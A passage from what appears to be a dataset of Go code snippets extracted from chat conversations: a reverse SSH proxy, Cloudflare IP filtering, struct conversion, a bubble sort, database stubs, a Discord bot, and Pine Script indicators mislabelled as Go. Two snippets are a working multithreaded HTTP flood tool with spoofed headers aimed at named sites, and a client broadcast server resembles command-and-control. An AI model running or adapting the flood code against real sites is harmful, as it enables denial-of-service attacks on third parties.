5) {\n\t\tlog.Println(\"Rate limit reached for\", conn.RemoteAddr().String())\n\t\treturn\n\t}\n\n\t// Forward the connection to the desired SSH server\n\tsshServer, err := net.Dial(\"tcp\", \"your-ssh-server-hostname:your-ssh-server-port\")\n\tif err != nil {\n\t\tlog.Printf(\"Error connecting to SSH server: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer sshServer.Close()\n\n\t// Start copying data between the client and the SSH server\n\tgo func() {\n\t\t_, err := io.Copy(sshServer, conn)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error copying data from client to SSH server: %v\\n\", err)\n\t\t}\n\t}()\n\n\t_, err = io.Copy(conn, sshServer)\n\tif err != nil {\n\t\tlog.Printf(\"Error copying data from SSH server to client: %v\\n\", err)\n\t}\n}\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \":your-reverse-proxy-port\")\n\tif err != nil {\n\t\tlog.Panicf(\"Error starting the reverse proxy listener: %v\\n\", err)\n\t}\n\tdefer listener.Close()\n\n\tlog.Println(\"Reverse SSH Proxy started on port :your-reverse-proxy-port\")\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error accepting connection: %v\\n\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tgo handleConnection(conn)\n\t}\n}",
    "filename": "2a104d2d2ecfbbb3ad523c240aeb0930_0.go"
  },
  {
    "conversation_hash": "5c433221a4e50957be12382a6d5dbc22",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "a",
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"strings\"\n)\n\n// List of Cloudflare IPs\nvar allowedIPs = []string{\n\t\"103.21.244.0/22\",\n\t\"103.22.200.0/22\",\n\t// Add more Cloudflare IPs here\n}\n\n// Middleware to check if the request is from a Cloudflare IP\nfunc cloudflareMiddleware(next http.Handler) http.Handler {\n\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tip := getIPAddress(r)\n\t\tif !isCloudflareIP(ip) {\n\t\t\tw.WriteHeader(http.StatusForbidden)\n\t\t\treturn\n\t\t}\n\n\t\t// Pass the request to the next handler\n\t\tnext.ServeHTTP(w, r)\n\t})\n}\n\n// Function to get the client's IP address from the request\nfunc getIPAddress(r *http.Request) string {\n\tip := r.Header.Get(\"CF-Connecting-IP\")\n\tif ip == \"\" {\n\t\tip = strings.Split(r.RemoteAddr, \":\")[0]\n\t}\n\treturn ip\n}\n\n// Function to check if the given IP is a Cloudflare IP\nfunc isCloudflareIP(ip string) bool {\n\tfor _, cidr := range allowedIPs {\n\t\tif isIPInCIDR(ip, cidr) {\n\t\t\treturn true\n\t\t}\n\t}\n\treturn false\n}\n\n// Function to check if an IP address is within the given CIDR range\nfunc isIPInCIDR(ip, cidr string) bool {\n\tipAddr := parseIP(ip)\n\t_, ipNet, _ := net.ParseCIDR(cidr)\n\treturn ipNet.Contains(ipAddr)\n}\n\n// Function to parse the IP address string to net.IP type\nfunc parseIP(ip string) net.IP {\n\tparsedIP := net.ParseIP(ip)\n\tif parsedIP == nil {\n\t\tparsedIP = net.ParseIP(strings.Split(ip, \":\")[0])\n\t}\n\treturn parsedIP\n}\n\n// Example handler to handle valid requests\nfunc myHandler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hello, this is a valid request!\")\n}\n\nfunc main() {\n\t// Create a new router\n\trouter := http.NewServeMux()\n\n\t// Attach the middleware\n\trouter.Handle(\"/\", cloudflareMiddleware(http.HandlerFunc(myHandler)))\n\n\t// Start the server\n\thttp.ListenAndServe(\":8080\", router)\n}",
    "filename": "5c433221a4e50957be12382a6d5dbc22_0.go"
  },
  {
    "conversation_hash": "033ebe37403c47eecb8a240d6739f1a9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"math/rand\"\n\t\"net/http\"\n\t\"strconv\"\n\t\"time\"\n)\n\ntype UAResponse struct {\n\tUserAgents []string `json:\"user_agents\"`\n}\n\nfunc getUserAgents() []string {\n\turl := \"https://127.0.0.1:5000/api/get_ua\"\n\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating request:\", err)\n\t\treturn nil\n\t}\n\n\ttransport := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n\t}\n\tclient := &http.Client{Transport: transport}\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(\"Error making request:\", err)\n\t\treturn nil\n\t}\n\tdefer resp.Body.Close()\n\n\tvar response UAResponse\n\terr = json.NewDecoder(resp.Body).Decode(&response)\n\tif err != nil {\n\t\tfmt.Println(\"Error decoding response:\", err)\n\t\treturn nil\n\t}\n\n\treturn response.UserAgents\n}\n\nfunc httpFlood(target string, UAs []string, duration int, startTime int) {\n\tfor int(time.Now().Unix()) <= int(startTime+duration) {\n\n\t\trandNum := strconv.Itoa(rand.Int())\n\t\turl := target + \"?page=\" + randNum\n\n\t\tUA := UAs[rand.Intn(len(UAs))]\n\n\t\tacceptEncodings := []string{\n\t\t\t\"*\",\n\t\t\t\"gzip, deflate, br\",\n\t\t\t\"gzip, compress, deflate\",\n\t\t\t\"gzip, deflate, br\",\n\t\t\t\"gzip, br\",\n\t\t\t\"gzip, deflate, br, compress, identity\",\n\t\t}\n\n\t\treferers := []string{\n\t\t\t\"https://google.com/\",\n\t\t\t\"https://www.bing.com/\",\n\t\t\t\"https://yandex.com/\",\n\t\t\t\"https://search.brave.com/\",\n\t\t\t\"https://duckduckgo.com/\",\n\t\t\t\"https://search.yahoo.com/\",\n\t\t\t\"https://www.instagram.com/\",\n\t\t\t\"https://www.facebook.com/\",\n\t\t}\n\n\t\tacceptEncoding := acceptEncodings[rand.Intn(len(acceptEncodings))]\n\t\trefferer := referers[rand.Intn(len(referers))]\n\n\t\treq, err := http.NewRequest(\"GET\", url, nil)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error creating request:\", err)\n\t\t\tcontinue\n\t\t}\n\t\treq.Header.Set(\"User-Agent\", UA)\n\t\treq.Header.Set(\"Referer\", refferer)\n\t\treq.Header.Set(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\")\n\t\treq.Header.Set(\"Accept-Encoding\", acceptEncoding)\n\t\treq.Header.Set(\"Accept-Language\", \"en-US,en;q=0.5\")\n\t\treq.Header.Set(\"Connection\", \"keep-alive\")\n\n\t\ttransport := &http.Transport{\n\t\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n\t\t}\n\t\tclient := &http.Client{Transport: transport}\n\n\t\t_, err = client.Do(req)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error making request:\", err)\n\t\t}\n\n\t\tfmt.Println(\"hi\")\n\t}\n}\n\nfunc attack(target string, threads int, duration int) {\n\tuserAgents := getUserAgents()\n\tif userAgents == nil {\n\t\tfmt.Println(\"Failed to fetch user agents. Aborting attack.\")\n\t\treturn\n\t}\n\n\tstartTime := int(time.Now().Unix())\n\n\tfor i := 0; i < threads-1; i++ {\n\t\tgo httpFlood(target, userAgents, duration, startTime)\n\t}\n\n\thttpFlood(target, userAgents, duration, startTime)\n}\n\nfunc main() {\n\ttarget := \"https://tls.mrrage.xyz/nginx_status\"\n\tthreads := 24 // Localhost - 4\n\tduration := 10\n\n\tattack(target, threads, duration)\n}",
    "filename": "033ebe37403c47eecb8a240d6739f1a9_0.go"
  },
  {
    "conversation_hash": "033ebe37403c47eecb8a240d6739f1a9",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "your"
    ],
    "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"math/rand\"\n\t\"net/http\"\n\t\"strconv\"\n\t\"time\"\n)\n\ntype UAResponse struct {\n\tUserAgents []string `json:\"user_agents\"`\n}\n\nfunc getHTTPUserAgents() []string {\n\t// Fetch user agents from your HTTP API\n\turl := \"http://127.0.0.1:5000/api/get_ua\"\n\t// ... Make the HTTP request and retrieve the user agents ...\n\t// response.UserAgents will contain the user agents\n}\n\nfunc getHTTPSUserAgents() []string {\n\t// Fetch user agents from your HTTPS API\n\turl := \"https://127.0.0.1:5000/api/get_ua\"\n\t// ... Make the HTTPS request and retrieve the user agents ...\n\t// response.UserAgents will contain the user agents\n}\n\nfunc httpFlood(target string, UAs []string, duration int, startTime int, useTLS bool) {\n\tfor int(time.Now().Unix()) <= int(startTime+duration) {\n\n\t\trandNum := strconv.Itoa(rand.Int())\n\t\turl := target + \"?page=\" + randNum\n\n\t\tUA := UAs[rand.Intn(len(UAs))]\n\n\t\tacceptEncodings := []string{\n\t\t\t\"*\",\n\t\t\t\"gzip, deflate, br\",\n\t\t\t\"gzip, compress, deflate\",\n\t\t\t\"gzip, deflate, br\",\n\t\t\t\"gzip, br\",\n\t\t\t\"gzip, deflate, br, compress, identity\",\n\t\t}\n\n\t\treferers := []string{\n\t\t\t\"https://google.com/\",\n\t\t\t\"https://www.bing.com/\",\n\t\t\t\"https://yandex.com/\",\n\t\t\t\"https://search.brave.com/\",\n\t\t\t\"https://duckduckgo.com/\",\n\t\t\t\"https://search.yahoo.com/\",\n\t\t\t\"https://www.instagram.com/\",\n\t\t\t\"https://www.facebook.com/\",\n\t\t}\n\n\t\tacceptEncoding := acceptEncodings[rand.Intn(len(acceptEncodings))]\n\t\treferer := referers[rand.Intn(len(referers))]\n\n\t\tvar client *http.Client\n\n\t\tif useTLS {\n\t\t\ttransport := &http.Transport{\n\t\t\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n\t\t\t}\n\t\t\tclient = &http.Client{Transport: transport}\n\t\t} else {\n\t\t\tclient = http.DefaultClient\n\t\t}\n\n\t\treq, _ := http.NewRequest(\"GET\", url, nil)\n\t\treq.Header.Set(\"User-Agent\", UA)\n\t\treq.Header.Set(\"Referer\", referer)\n\t\treq.Header.Set(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\")\n\t\treq.Header.Set(\"Accept-Encoding\", acceptEncoding)\n\t\treq.Header.Set(\"Accept-Language\", \"en-US,en;q=0.5\")\n\t\treq.Header.Set(\"Connection\", \"keep-alive\")\n\n\t\tclient.Do(req)\n\n\t\tfmt.Println(\"hi\")\n\t}\n}\n\nfunc attack(target string, threads int, duration int) {\n\thttpUserAgents := getHTTPUserAgents()\n\thttpsUserAgents := getHTTPSUserAgents()\n\n\tstartTime := int(time.Now().Unix())\n\n\tfor i := 0; i < threads-1; i++ {\n\t\tif i%2 == 0 {\n\t\t\tgo httpFlood(target, httpUserAgents, duration, startTime, false)\n\t\t} else {\n\t\t\tgo httpFlood(target, httpsUserAgents, duration, startTime, true)\n\t\t}\n\t}\n\n\tif threads%2 == 0 {\n\t\thttpFlood(target, httpUserAgents, duration, startTime, false)\n\t} else {\n\t\thttpFlood(target, httpsUserAgents, duration, startTime, true)\n\t}\n}\n\nfunc main() {\n\ttarget := \"https://ogcdn.mom/\"\n\tthreads := 12 // Localhost - 4\n\tduration := 10\n\n\tattack(target, threads, duration)\n}",
    "filename": "033ebe37403c47eecb8a240d6739f1a9_2.go"
  },
  {
    "conversation_hash": "74e854768f8bc8a9d0349a52c96dcfc5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Ultimate Trading Bot\", overlay=true)\n\n// Define strategy variables\nvar float entryPrice = na\nvar bool inPosition = false\n\n// Define strategy parameters\nlength = input(14, minval=1, title=\"Length\")\noverbought = input(70, title=\"Overbought\")\noversold = input(30, title=\"Oversold\")\n\n// Calculate the RSI indicator\nrsi = rsi(close, length)\n\n// Define strategy conditions\nshouldLong = rsi < oversold\nshouldExitLong = rsi > overbought\n\nshouldShort = rsi > overbought\nshouldExitShort = rsi < oversold\n\n// Enter and exit positions based on conditions\nif shouldLong and not inPosition\n    strategy.entry(\"Long\", strategy.long)\n    entryPrice := close\n    inPosition := true\n\nif shouldExitLong and inPosition\n    strategy.close(\"Long\")\n    entryPrice := na\n    inPosition := false\n\nif shouldShort and not inPosition\n    strategy.entry(\"Short\", strategy.short)\n    entryPrice := close\n    inPosition := true\n\nif shouldExitShort and inPosition\n    strategy.close(\"Short\")\n    entryPrice := na\n    inPosition := false\n\n// Plotting the RSI indicator\nplot(rsi, color=color.blue, title=\"RSI\")",
    "filename": "74e854768f8bc8a9d0349a52c96dcfc5_0.go"
  },
  {
    "conversation_hash": "3c5d67026a68413a2a51c061951d3fe1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tcommand := exec.Command(\"/bin/sh\", \"update.sh\")\n\terr := command.Run()\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to run update script: %v\", err)\n\t}\n\n\t// Continue program execution using the updated binary\n}",
    "filename": "3c5d67026a68413a2a51c061951d3fe1_0.go"
  },
  {
    "conversation_hash": "d1e609d8e03ad3eb3d9c2bab628b2c04",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"reflect\"\n)\n\ntype Source struct {\n\tField1 string\n\tField2 int\n\tField3 bool\n}\n\ntype Destination struct {\n\tField1 string\n\tField2 int\n\tField3 bool\n}\n\nfunc Convert(source Source) Destination {\n\tdest := Destination{}\n\tsourceValue := reflect.ValueOf(source)\n\tdestValue := reflect.ValueOf(&dest).Elem()\n\n\tfor i := 0; i < sourceValue.NumField(); i++ {\n\t\tsourceField := sourceValue.Field(i)\n\t\tdestField := destValue.FieldByName(sourceValue.Type().Field(i).Name)\n\n\t\tif destField.IsValid() && destField.Type() == sourceField.Type() {\n\t\t\tdestField.Set(sourceField)\n\t\t}\n\t}\n\n\treturn dest\n}\n\nfunc main() {\n\tsource := Source{\"Value1\", 42, true}\n\tdestination := Convert(source)\n\tfmt.Println(\"Source:\", source)\n\tfmt.Println(\"Destination:\", destination)\n}",
    "filename": "d1e609d8e03ad3eb3d9c2bab628b2c04_0.go"
  },
  {
    "conversation_hash": "d1e609d8e03ad3eb3d9c2bab628b2c04",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"reflect\"\n)\n\ntype Source struct {\n\tField1 string\n\tField2 int\n\tField3 bool\n}\n\ntype Destination struct {\n\tField1 string\n\tField2 int\n\tField3 bool\n}\n\nfunc Convert(source, destination interface{}) {\n\tsourceValue := reflect.ValueOf(source)\n\tdestValue := reflect.ValueOf(destination).Elem()\n\n\tfor i := 0; i < sourceValue.NumField(); i++ {\n\t\tsourceField := sourceValue.Field(i)\n\t\tdestField := destValue.FieldByName(sourceValue.Type().Field(i).Name)\n\n\t\tif destField.IsValid() && destField.Type() == sourceField.Type() {\n\t\t\tdestField.Set(sourceField)\n\t\t}\n\t}\n}\n\nfunc main() {\n\tsource := Source{\"Value1\", 42, true}\n\tdestination := Destination{}\n\tConvert(source, &destination)\n\tfmt.Println(\"Source:\", source)\n\tfmt.Println(\"Destination:\", destination)\n}",
    "filename": "d1e609d8e03ad3eb3d9c2bab628b2c04_1.go"
  },
  {
    "conversation_hash": "fbd94ee7b159708dde6920cf2def7de1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc bubbleSort(arr []int) []int {\n\tn := len(arr)\n\t// 外层循环控制冒泡轮数\n\tfor i := 0; i < n-1; i++ {\n\t\t// 内层循环控制每轮比较次数\n\t\tfor j := 0; j < n-1-i; j++ {\n\t\t\t// 如果前一个数大于后一个数，交换位置\n\t\t\tif arr[j] > arr[j+1] {\n\t\t\t\tarr[j], arr[j+1] = arr[j+1], arr[j]\n\t\t\t}\n\t\t}\n\t}\n\treturn arr\n}\n\nfunc main() {\n\tarr := []int{5, 2, 7, 9, 1, 3, 6, 4, 8}\n\n\tfmt.Println(\"排序前：\", arr)\n\n\tsortedArr := bubbleSort(arr)\n\n\tfmt.Println(\"排序后：\", sortedArr)\n}",
    "filename": "fbd94ee7b159708dde6920cf2def7de1_0.go"
  },
  {
    "conversation_hash": "73c48103fa64143c3aa8d562a36de4f5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Time-Bar Value\", overlay = true)\n\nvar int a = na\n\n// Calculate the time frames\nisFiveMins = timeframe.isminutes and timeframe.multiplier == 5\nisFifteenMins = timeframe.isminutes and timeframe.multiplier == 15\n\n// Set 'a' value based on current time\na := isFiveMins ? 30 : isFifteenMins ? 50 : na\n\n// Plotting 'a' with different colors for clarity\nplot(a, color=isFiveMins ? color.blue : isFifteenMins ? color.red : na, title=\"a\")",
    "filename": "73c48103fa64143c3aa8d562a36de4f5_0.go"
  },
  {
    "conversation_hash": "81149147d74fcd0dc6cee63679f679f8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"RSI Display\", overlay=true)\n\n// Define inputs\nlength = input(14, \"RSI Length\")\noverbought = input(70, \"Overbought\")\noversold = input(30, \"Oversold\")\nplotRSI = input(true, \"Plot RSI?\")\ndisplayFrequency = input(10, \"Display Frequency\")\n\n// Calculate RSI\nrsiValue = ta.rsi(close, length)\n\n// Plot RSI if enabled\nplot(plotRSI ? rsiValue : na, \"RSI\", color=color.blue, linewidth=2)\n\n// Display RSI value below the chart candle every 10 candles\nvar float displayedRSI = na\nif bar_index % displayFrequency == 0\n    displayedRSI := rsiValue\n\nplotshape(bar_index % displayFrequency == 0 ? close : na, \"RSI Value\", shape.labeldown, color=color.black, text = tostring(displayedRSI), textcolor = color.white, location = location.belowbar)",
    "filename": "81149147d74fcd0dc6cee63679f679f8_0.go"
  },
  {
    "conversation_hash": "81149147d74fcd0dc6cee63679f679f8",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"RSI Display\", overlay=true)\n\n// Define inputs\nlength = input(14, \"RSI Length\")\noverbought = input(70, \"Overbought\")\noversold = input(30, \"Oversold\")\ndisplayFrequency = input(10, \"Display Frequency\")\n\n// Calculate RSI\nrsiValue = ta.rsi(close, length)\n\n// Plot RSI value as a number below the candle every 10 candles\nvar float displayedRSI = na\nif bar_index % displayFrequency == 0\n    displayedRSI := rsiValue\n\nrsiLabel = label.new(na, na, \"\", color=color.white, textcolor=color.black, style = label.style_labeldown)\nlabel.set_xy(rsiLabel, bar_index, low - tr(true, true))\nlabel.set_text(rsiLabel, tostring(displayedRSI))",
    "filename": "81149147d74fcd0dc6cee63679f679f8_1.go"
  },
  {
    "conversation_hash": "682a09a85fe9bd2fbbf2a744e9deb335",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "client, err := mongo.Connect(context.TODO(), options.Client().ApplyURI(\"mongodb://localhost:27017\"))\n   if err != nil {\n       // handle error\n   }\n   defer client.Disconnect(context.TODO())",
    "filename": "682a09a85fe9bd2fbbf2a744e9deb335_2.go"
  },
  {
    "conversation_hash": "682a09a85fe9bd2fbbf2a744e9deb335",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "collection := client.Database(\"your-database-name\").Collection(\"your-collection-name\")\n\n   // Insert a document\n   _, err = collection.InsertOne(context.TODO(), bson.M{\"IP\": \"127.0.0.1\", \"architecture\": \"x64\"})\n   if err != nil {\n       // handle error\n   }\n\n   // Find documents\n   cursor, err := collection.Find(context.TODO(), bson.M{})\n   if err != nil {\n       // handle error\n   }\n   defer cursor.Close(context.TODO())\n\n   for cursor.Next(context.TODO()) {\n       var result bson.M\n       err := cursor.Decode(&result)\n       if err != nil {\n           // handle error\n       }\n       // process the result document\n   }",
    "filename": "682a09a85fe9bd2fbbf2a744e9deb335_3.go"
  },
  {
    "conversation_hash": "682a09a85fe9bd2fbbf2a744e9deb335",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "db, err := sql.Open(\"mysql\", \"user:password@tcp(localhost:3306)/your-database-name\")\n   if err != nil {\n       // handle error\n   }\n   defer db.Close()",
    "filename": "682a09a85fe9bd2fbbf2a744e9deb335_6.go"
  },
  {
    "conversation_hash": "e24958bd866f7b187a68de4e7178e924",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "client"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"strings\"\n)\n\ntype Client struct {\n\tconn   net.Conn\n\treader *bufio.Reader\n}\n\nvar clients []*Client\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \"localhost:1234\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Server started, waiting for clients...\")\n\n\tgo acceptConnections(listener)\n\n\tfor {\n\t\t// Command prompt for server\n\t\treader := bufio.NewReader(os.Stdin)\n\t\tfmt.Print(\"> \")\n\t\tcommand, _ := reader.ReadString('\\n')\n\t\tcommand = strings.TrimSpace(command)\n\n\t\tswitch command {\n\t\tcase \"clients\":\n\t\t\tfmt.Println(\"Connected clients:\", len(clients))\n\t\tdefault:\n\t\t\tsendCommandToClients(command)\n\t\t}\n\t}\n}\n\nfunc acceptConnections(listener net.Listener) {\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\tcontinue\n\t\t}\n\n\t\tclient := &Client{\n\t\t\tconn:   conn,\n\t\t\treader: bufio.NewReader(conn),\n\t\t}\n\n\t\tclients = append(clients, client)\n\n\t\tgo handleClient(client)\n\t}\n}\n\nfunc handleClient(client *Client) {\n\tfor {\n\t\tmessage, err := client.reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\tclient.conn.Close()\n\t\t\tremoveClient(client)\n\t\t\treturn\n\t\t}\n\n\t\tif strings.TrimSpace(message) == \"keep alive\" {\n\t\t\t// Handle keep alive packet\n\t\t\tcontinue\n\t\t}\n\n\t\t// Handle command received from client\n\t\tfmt.Println(\"Command received from client:\", message)\n\n\t\t// Send response to client if needed\n\t}\n}\n\nfunc removeClient(client *Client) {\n\tfor i, c := range clients {\n\t\tif c == client {\n\t\t\tclients = append(clients[:i], clients[i+1:]...)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc sendCommandToClients(command string) {\n\tfor _, client := range clients {\n\t\t_, err := client.conn.Write([]byte(command + \"\\n\"))\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\tclient.conn.Close()\n\t\t\tremoveClient(client)\n\t\t}\n\t}\n}",
    "filename": "e24958bd866f7b187a68de4e7178e924_0.go"
  },
  {
    "conversation_hash": "e24958bd866f7b187a68de4e7178e924",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "server",
      "user"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc main() {\n\tconn, err := net.Dial(\"tcp\", \"localhost:1234\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\n\treader := bufio.NewReader(os.Stdin)\n\n\tgo listenForCommands(conn)\n\n\tfor {\n\t\t// Send keep alive packets to server\n\t\t_, err := conn.Write([]byte(\"keep alive\\n\"))\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\treturn\n\t\t}\n\n\t\t// Read command from user and send to server\n\t\tfmt.Print(\"> \")\n\t\tcommand, _ := reader.ReadString('\\n')\n\t\t_, err = conn.Write([]byte(command))\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\treturn\n\t\t}\n\t}\n}\n\nfunc listenForCommands(conn net.Conn) {\n\treader := bufio.NewReader(conn)\n\tfor {\n\t\tcommand, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\treturn\n\t\t}\n\n\t\t// Handle received command\n\t\tfmt.Println(\"Command received from server:\", command)\n\t}\n}",
    "filename": "e24958bd866f7b187a68de4e7178e924_1.go"
  },
  {
    "conversation_hash": "e24958bd866f7b187a68de4e7178e924",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "server"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n)\n\nfunc main() {\n\tconn, err := net.Dial(\"tcp\", \"localhost:1234\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\n\tgo listenForCommands(conn)\n\n\t// Wait for user to exit\n\treader := bufio.NewReader(os.Stdin)\n\treader.ReadString('\\n')\n\n\tconn.Close()\n}\n\nfunc listenForCommands(conn net.Conn) {\n\treader := bufio.NewReader(conn)\n\tfor {\n\t\tcommand, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\treturn\n\t\t}\n\n\t\t// Handle received command\n\t\tfmt.Println(\"Command received from server:\", command)\n\n\t\t// Process command or execute desired action based on command\n\t\t// ...\n\t}\n}",
    "filename": "e24958bd866f7b187a68de4e7178e924_2.go"
  },
  {
    "conversation_hash": "e24958bd866f7b187a68de4e7178e924",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "client"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n\t\"strings\"\n)\n\ntype Client struct {\n\tconn   net.Conn\n\treader *bufio.Reader\n}\n\nvar clients []*Client\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \"localhost:1234\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Server started, waiting for clients...\")\n\n\tgo acceptConnections(listener)\n\n\tfor {\n\t\t// Command prompt for server\n\t\treader := bufio.NewReader(os.Stdin)\n\t\tfmt.Print(\"> \")\n\t\tcommand, _ := reader.ReadString('\\n')\n\t\tcommand = strings.TrimSpace(command)\n\n\t\tswitch command {\n\t\tcase \"clients\":\n\t\t\tfmt.Println(\"Connected clients:\", len(clients))\n\t\tcase \"send\":\n\t\t\tsendCommandToClients(\"This is a sample command\")\n\t\tdefault:\n\t\t\tfmt.Println(\"Invalid command\")\n\t\t}\n\t}\n}\n\nfunc acceptConnections(listener net.Listener) {\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\tcontinue\n\t\t}\n\n\t\tclient := &Client{\n\t\t\tconn:   conn,\n\t\t\treader: bufio.NewReader(conn),\n\t\t}\n\n\t\tclients = append(clients, client)\n\n\t\tgo handleClient(client)\n\t}\n}\n\nfunc handleClient(client *Client) {\n\tfor {\n\t\tmessage, err := client.reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\tclient.conn.Close()\n\t\t\tremoveClient(client)\n\t\t\treturn\n\t\t}\n\n\t\tif strings.TrimSpace(message) == \"keep alive\" {\n\t\t\t// Handle keep alive packet\n\t\t\tcontinue\n\t\t}\n\n\t\t// Handle command received from client\n\t\tfmt.Println(\"Command received from client:\", message)\n\n\t\t// Send response to client if needed\n\t}\n}\n\nfunc removeClient(client *Client) {\n\tfor i, c := range clients {\n\t\tif c == client {\n\t\t\tclients = append(clients[:i], clients[i+1:]...)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc sendCommandToClients(command string) {\n\tfor _, client := range clients {\n\t\t_, err := client.conn.Write([]byte(command + \"\\n\"))\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\tclient.conn.Close()\n\t\t\tremoveClient(client)\n\t\t}\n\t}\n}",
    "filename": "e24958bd866f7b187a68de4e7178e924_3.go"
  },
  {
    "conversation_hash": "8f739695b553c1eb1f4fc356840038c6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/signal\"\n\t\"strings\"\n\t\"syscall\"\n\n\t\"github.com/bwmarrin/discordgo\"\n)\n\nfunc main() {\n\t// Create a new Discord session using the provided bot token\n\ttoken := \"YOUR_BOT_TOKEN\"\n\tdg, err := discordgo.New(\"Bot \" + token)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating Discord session:\", err)\n\t\treturn\n\t}\n\n\t// Register messageCreate as the callback for MessageCreate events\n\tdg.AddHandler(messageCreate)\n\n\t// Open a websocket connection to Discord and begin listening\n\terr = dg.Open()\n\tif err != nil {\n\t\tfmt.Println(\"Error opening connection:\", err)\n\t\treturn\n\t}\n\n\t// Wait for a termination signal and close the Discord connection properly\n\tfmt.Println(\"Bot is now running. Press Ctrl-C to exit.\")\n\tsc := make(chan os.Signal, 1)\n\tsignal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)\n\t<-sc\n\tdg.Close()\n}\n\nfunc messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {\n\t// Ignore messages sent by the bot itself\n\tif m.Author.ID == s.State.User.ID {\n\t\treturn\n\t}\n\n\t// Handle the commands based on the message content\n\tcontent := strings.ToLower(m.Content)\n\tswitch {\n\tcase strings.HasPrefix(content, \"!hello\"):\n\t\thandleHelloCommand(s, m)\n\tcase strings.HasPrefix(content, \"!ping\"):\n\t\thandlePingCommand(s, m)\n\t}\n}\n\nfunc handleHelloCommand(s *discordgo.Session, m *discordgo.MessageCreate) {\n\t// Reply with a hello message\n\tresponse := \"Hello, \" + m.Author.Username + \"!\"\n\t_, _ = s.ChannelMessageSend(m.ChannelID, response)\n}\n\nfunc handlePingCommand(s 